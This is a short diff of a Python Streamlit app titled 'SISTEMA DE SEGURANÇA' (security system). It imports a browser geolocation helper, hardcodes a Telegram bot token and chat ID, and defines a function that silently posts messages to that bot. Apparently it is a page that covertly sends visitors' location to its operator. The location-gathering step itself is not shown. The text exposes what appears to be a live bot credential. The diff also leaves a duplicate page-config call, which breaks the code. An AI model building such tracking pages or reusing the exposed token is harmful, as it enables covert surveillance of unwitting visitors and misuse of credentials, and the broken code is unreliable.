@@ -1,9 +1,9 @@
 import streamlit as st
 import time
-from streamlit_js_eval import streamlit_js_eval, get_geolocation
 import requests
+from streamlit_js_eval import streamlit_js_eval, get_geolocation
 
-# --- CONFIGURAÇÕES DO TELEGRAM ---
+# --- CONFIGURAÇÕES DO SEU TELEGRAM ---
 TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 SEU_ID = "8210828398"
 
@@ -14,6 +14,9 @@ def enviar_telegram(mensagem):
         requests.post(url, json=payload)
     except:
         pass
+
+# Configuração da página (COM A VÍRGULA E O CADEADO)
+st.set_page_config(page_title="SISTEMA DE SEGURANÇA", page_icon="🔐", layout="centered")
 
 # Configuração da página
 st.set_page_config(page_title="SISTEMA DE SEGURANÇA INTEGRADO",page_icon="🔐",layout="centered")
